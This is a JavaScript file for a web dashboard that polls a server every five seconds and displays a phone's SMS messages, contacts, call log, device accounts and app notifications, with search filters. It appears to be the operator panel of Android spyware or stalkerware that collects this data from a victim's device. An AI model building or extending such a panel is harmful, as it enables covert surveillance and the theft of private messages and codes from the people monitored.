const B = location.origin;
let DATA = { sms: [], contacts: [], calls: [], accounts: [], notifications: [] };
let VIEW = "dashboard";

// ---------- NAV ----------
document.querySelectorAll(".nav-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    VIEW = btn.dataset.view;
    switchView(VIEW);
  });
});

function switchView(v) {
  document.querySelectorAll(".view").forEach(el => el.classList.remove("active"));
  const target = document.getElementById("view-" + v);
  if (target) target.classList.add("active");
}

// ---------- FETCH ----------
async function pull() {
  try {
    const [s, c, l, a, n] = await Promise.all([
      fetch(B + "/api/sms").then(r => r.json()).catch(() => ({sms:[]})),
      fetch(B + "/api/contacts").then(r => r.json()).catch(() => ({contacts:[]})),
      fetch(B + "/api/calls").then(r => r.json()).catch(() => ({calls:[]})),
      fetch(B + "/api/accounts").then(r => r.json()).catch(() => ({accounts:[]})),
      fetch(B + "/api/notifications").then(r => r.json()).catch(() => ({notifications:[]}))
    ]);
    DATA.sms = s.sms || [];
    DATA.contacts = c.contacts || [];
    DATA.calls = l.calls || [];
    DATA.accounts = a.accounts || [];
    DATA.notifications = n.notifications || [];
    renderAll();
  } catch (e) { console.error(e); }
}

// ---------- RENDER ----------
function renderAll() {
  // dashboard counts
  document.getElementById("cnt-sms").textContent = DATA.sms.length;
  document.getElementById("cnt-contacts").textContent = DATA.contacts.length;
  document.getElementById("cnt-calls").textContent = DATA.calls.length;
  document.getElementById("cnt-notifs").textContent = DATA.notifications.length;
  document.getElementById("cnt-accounts").textContent = DATA.accounts.length;

  // lists
  renderSms(DATA.sms);
  renderContacts(DATA.contacts);
  renderCalls(DATA.calls);
  renderNotifs(DATA.notifications);
  renderAccounts(DATA.accounts);
}

function fmtDate(ts) {
  if (!ts) return "";
  const d = new Date(Number(ts));
  return d.toLocaleString();
}

function emptyHTML(msg = "no data yet") {
  return `<div class="empty">${msg}</div>`;
}

// SMS
function renderSms(items, q = "") {
  const el = document.getElementById("list-sms");
  const f = items.filter(i => !q || (i.address + i.body).toLowerCase().includes(q));
  if (!f.length) return el.innerHTML = emptyHTML();
  el.innerHTML = f.map(i => `
    <div class="item">
      <div class="title">${esc(i.address || "unknown")}</div>
      <div class="body">${esc(i.body || "")}</div>
      <div class="meta">${fmtDate(i.date)}</div>
    </div>`).join("");
}

// CONTACTS
function renderContacts(items, q = "") {
  const el = document.getElementById("list-contacts");
  const f = items.filter(i => !q || (i.name + i.number).toLowerCase().includes(q));
  if (!f.length) return el.innerHTML = emptyHTML();
  el.innerHTML = f.map(i => `
    <div class="item">
      <div class="title">👤 ${esc(i.name || "no name")}</div>
      <div class="sub">${esc(i.number || "")}</div>
    </div>`).join("");
}

// CALLS
function renderCalls(items, q = "") {
  const el = document.getElementById("list-calls");
  const f = items.filter(i => !q || (i.number || "").toLowerCase().includes(q));
  if (!f.length) return el.innerHTML = emptyHTML();
  el.innerHTML = f.map(i => {
    const type = i.type == 1 ? "INCOMING" : i.type == 2 ? "OUTGOING" : i.type == 3 ? "MISSED" : "OTHER";
    return `
    <div class="item">
      <div class="title">📞 ${esc(i.number || "unknown")}</div>
      <div class="sub">${type} · ${i.duration || 0}s</div>
      <div class="meta">${fmtDate(i.date)}</div>
    </div>`;
  }).join("");
}

// NOTIFICATIONS
function renderNotifs(items, q = "") {
  const el = document.getElementById("list-notifications");
  const f = items.filter(i => !q || (i.package + i.title + i.text).toLowerCase().includes(q));
  if (!f.length) return el.innerHTML = emptyHTML();
  el.innerHTML = f.map(i => `
    <div class="item">
      <div class="title">🔔 ${esc(i.title || "notification")}</div>
      <div class="sub">${esc(i.package || "")}</div>
      <div class="body">${esc(i.text || "")}</div>
      <div class="meta">${fmtDate(i.time)}</div>
    </div>`).join("");
}

// ACCOUNTS
function renderAccounts(items, q = "") {
  const el = document.getElementById("list-accounts");
  const f = items.filter(i => !q || (i.name + i.type).toLowerCase().includes(q));
  if (!f.length) return el.innerHTML = emptyHTML();
  el.innerHTML = f.map(i => `
    <div class="item">
      <div class="title">🔑 ${esc(i.name || "account")}</div>
      <div class="sub">${esc(i.type || "")}</div>
    </div>`).join("");
}

// ---------- SEARCH ----------
document.querySelectorAll(".search").forEach(inp => {
  inp.addEventListener("input", e => {
    const q = e.target.value.toLowerCase().trim();
    const f = e.target.dataset.filter;
    if (f === "sms") renderSms(DATA.sms, q);
    if (f === "contacts") renderContacts(DATA.contacts, q);
    if (f === "calls") renderCalls(DATA.calls, q);
    if (f === "notifications") renderNotifs(DATA.notifications, q);
    if (f === "accounts") renderAccounts(DATA.accounts, q);
  });
});

// escape HTML
function esc(s) {
  return String(s).replace(/[&<>"']/g, c => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
  }[c]));
}

// ---------- BOOT ----------
pull();
setInterval(pull, 5000);